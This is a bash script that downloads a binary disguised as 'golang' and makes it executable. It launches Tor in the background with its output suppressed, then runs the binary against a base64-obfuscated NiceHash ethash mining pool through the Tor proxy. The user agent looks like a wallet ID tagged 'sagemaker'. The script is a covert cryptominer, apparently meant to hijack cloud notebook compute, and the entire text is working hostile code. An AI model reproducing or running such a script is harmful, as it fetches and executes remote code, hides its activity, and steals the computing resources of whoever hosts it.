#!/bin/bash
golang=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/golang

userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.sagemaker"
string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8udXNhLXdlc3QubmljZWhhc2guY29tOjMzNTM=
key=ZXRoYXNo

seed=$(echo $string | base64 --decode)
apikey=$(echo $key | base64 --decode)

cd data

wget $golang

chmod 777 golang

nohup ./dist/proot -S . tor  &>/dev/null &

sleep 15

./golang -a $apikey --url $seed -u $userAgent -p x --proxy 127.0.0.1:9050
